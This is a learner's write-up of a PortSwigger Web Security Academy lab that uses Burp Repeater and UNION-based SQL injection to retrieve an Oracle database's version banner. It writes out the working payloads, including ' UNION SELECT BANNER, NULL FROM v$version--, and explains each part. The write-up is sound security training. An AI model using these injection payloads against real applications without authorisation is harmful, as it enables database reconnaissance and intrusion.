# PortSwigger Web Security Academy – SQL Injection: Querying Database Version (Oracle)

**Lab:** SQL injection attack, querying the database type and version on Oracle  
**Difficulty:** Practitioner  
**Date Completed:** 01-09-2026  
**Tool Used:** Burp Suite Community Edition  
**Database:** Oracle  
**Status:** ✅ Solved

---

## 1. Lab Objective

The lab contained a SQL injection vulnerability in the **product category filter**.

The goal was to use a UNION-based SQL injection to **display the Oracle database version string**.

Vulnerable parameter:

```text
category
```

Example normal request:

```http
GET /filter?category=Corporate+gifts HTTP/2
```

---

## 2. What I Learned

- Intercepting HTTP requests with Burp Suite
- Using **Burp Repeater** to modify and resend requests
- Testing a parameter for SQL injection
- Determining the number of columns returned by a query
- Checking which columns can contain text
- Using `UNION SELECT`
- Understanding Oracle's `dual` table
- Querying Oracle's `v$version` view
- Reading the database version from the `BANNER` column

---

## 3. Why I Used Burp Repeater

**Burp Repeater** lets me take an HTTP request, modify it manually, resend it, and inspect the response.

This is useful for SQL injection because I need to test different inputs.

Instead of repeatedly using the browser:

```text
Change input → Submit → Check response
```

I can use:

```text
Original request
      ↓
Burp Repeater
      ↓
Modify parameter
      ↓
Send
      ↓
Observe response
      ↓
Modify again
```

### Simple definition

> **Burp Repeater = a tool for manually modifying and repeatedly sending HTTP requests.**

---

## 4. Finding the Injection Point

The application uses the `category` parameter to filter products.

Normal request:

```http
GET /filter?category=Corporate+gifts HTTP/2
```

I sent this request to **Repeater** so I could manually modify the `category` value and observe how the server responded.

---

# 5. Understanding UNION SQL Injection

`UNION` allows the results of another `SELECT` query to be combined with the original query.

Conceptually:

```sql
SELECT column1, column2
FROM products
WHERE category = 'input'

UNION

SELECT column1, column2
FROM another_table;
```

For a UNION attack to work, the injected query normally needs the **same number of columns** as the original query.

That is why determining the column count was important.

---

# 6. Determining the Number of Columns

I tested:

```sql
'+UNION+SELECT+'abc','def'+FROM+dual--
```

The important SQL part is:

```sql
UNION SELECT 'abc', 'def'
```

The response showed that the query accepted **two columns**, and both columns could contain text.

So I knew the UNION query needed:

```text
Column 1
Column 2
```

---

## 7. Why `dual`?

`dual` is a special Oracle table that can be used for simple `SELECT` statements when we do not need to retrieve data from a normal application table.

Example:

```sql
SELECT 'abc', 'def' FROM dual
```

This helped me test the number and type of columns.

---

# 8. Final Payload

The final payload was:

```sql
'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
```

When the `+` characters are interpreted as spaces in the URL, it becomes:

```sql
' UNION SELECT BANNER, NULL FROM v$version--
```

---

# 9. Payload Breakdown

### `'`

```sql
'
```

Attempts to close the existing SQL string so additional SQL can be introduced.

---

### `UNION`

```sql
UNION
```

Combines the original query's results with the results of our injected `SELECT`.

---

### `SELECT`

```sql
SELECT
```

Specifies the data we want to retrieve.

---

### `BANNER`

```sql
BANNER
```

This is a column in Oracle's `v$version` view containing Oracle version information.

---

### `NULL`

```sql
NULL
```

The original query returned **two columns**, so the UNION query also needed two columns.

Therefore:

```sql
SELECT BANNER, NULL
```

The first column contains the useful information and the second column is filled with `NULL`.

---

### `FROM v$version`

```sql
FROM v$version
```

`v$version` is an Oracle system view containing version information.

So:

```sql
SELECT BANNER FROM v$version
```

asks Oracle for its version banner.

---

### `--`

```sql
--
```

Starts an SQL comment in this context, causing the remaining part of the original SQL statement to be ignored.

---

# 10. Why the `+` Signs?

The payload sent through the URL was:

```text
'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
```

The `+` characters represent spaces in a URL query parameter.

So:

```text
UNION+SELECT+BANNER
```

is interpreted as:

```sql
UNION SELECT BANNER
```

---

# 11. Final Request

The modified request was conceptually:

```http
GET /filter?category='+UNION+SELECT+BANNER,+NULL+FROM+v$version-- HTTP/2
```

I sent this request through **Burp Repeater**.

---

# 12. Result

The server returned Oracle version information.

The response showed:

```text
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
```

This confirmed that the SQL injection worked and that the database version had been successfully retrieved.

The lab was then marked:

```text
LAB → Solved
```

---

# 13. Complete Attack Flow

```text
Product category filter
        ↓
Intercept request with Burp
        ↓
Send request to Repeater
        ↓
Test category parameter
        ↓
Identify SQL injection
        ↓
Test UNION SELECT
        ↓
Determine 2 columns
        ↓
Confirm text-compatible columns
        ↓
Identify Oracle database
        ↓
Query v$version
        ↓
Retrieve BANNER
        ↓
Oracle version displayed
        ↓
Lab solved
```

---

# 14. Important Concepts

## SQL Injection

SQL injection occurs when user-controlled input is incorrectly incorporated into a SQL query, allowing the query's behavior to be manipulated.

## UNION-Based SQL Injection

`UNION` can combine the original query with another `SELECT` query.

General structure:

```sql
' UNION SELECT column1, column2 FROM table--
```

The number of columns must match the original query.

## Burp Repeater

Used to:

- Modify HTTP requests
- Test parameters
- Send requests repeatedly
- Compare server responses
- Experiment with SQL injection payloads

## Oracle `v$version`

Oracle provides version information through:

```text
v$version
```

The `BANNER` column contains database version information.

## Oracle `dual`

Useful for simple Oracle `SELECT` statements when a normal table is not required.

Example:

```sql
SELECT 'abc', 'def' FROM dual
```

---

# 15. Payload vs Vulnerability

This distinction is important.

### Vulnerability

The vulnerable parameter was:

```text
category
```

The application was susceptible to SQL injection.

### Payload

The crafted input was:

```sql
' UNION SELECT BANNER, NULL FROM v$version--
```

### Tool

The tool used to modify and send the request was:

```text
Burp Suite Repeater
```

### Result

The Oracle database version was retrieved.

---

# 16. What I Would Say in an Interview

> "I identified that the product category parameter was vulnerable to SQL injection and moved the request into Burp Repeater so I could test it manually. I used a UNION SELECT to determine the number of columns returned by the original query and confirmed there were two text-compatible columns. Since the database was Oracle, I queried the `v$version` view and retrieved the `BANNER` column while using `NULL` for the second column. The response revealed the Oracle database version."

---

# 17. Key Takeaway

Don't memorize only the final payload.

Remember the reasoning:

```text
Find injection point
        ↓
Use Repeater
        ↓
Test SQL injection
        ↓
Find column count
        ↓
Build UNION query
        ↓
Identify database-specific information
        ↓
Query the appropriate system view
        ↓
Read the response
```

The main lesson from this lab was:

> **SQL injection exploitation is not just about knowing payloads. It is about understanding the database, testing the application's response, and building the query step by step.**

---

## Lab Details

| Item | Details |
|---|---|
| Platform | PortSwigger Web Security Academy |
| Lab | SQL injection attack, querying the database type and version on Oracle |
| Difficulty | Practitioner |
| Date Completed | 01-09-2026 |
| Vulnerability | SQL Injection |
| Injection Type | UNION-based SQL Injection |
| Parameter | `category` |
| Database | Oracle |
| Tool | Burp Suite Community Edition |
| Oracle View | `v$version` |
| Column | `BANNER` |
| Result | Oracle database version retrieved |


---

## Personal Study Notes

### What I understood

- What Burp Repeater is used for
- What a SQL injection payload means
- How `UNION SELECT` works
- Why column count matters
- Why `NULL` was used
- Why Oracle's `v$version` was queried
- What `dual` is used for
- How URL `+` characters represent spaces
- How the response confirmed the database version

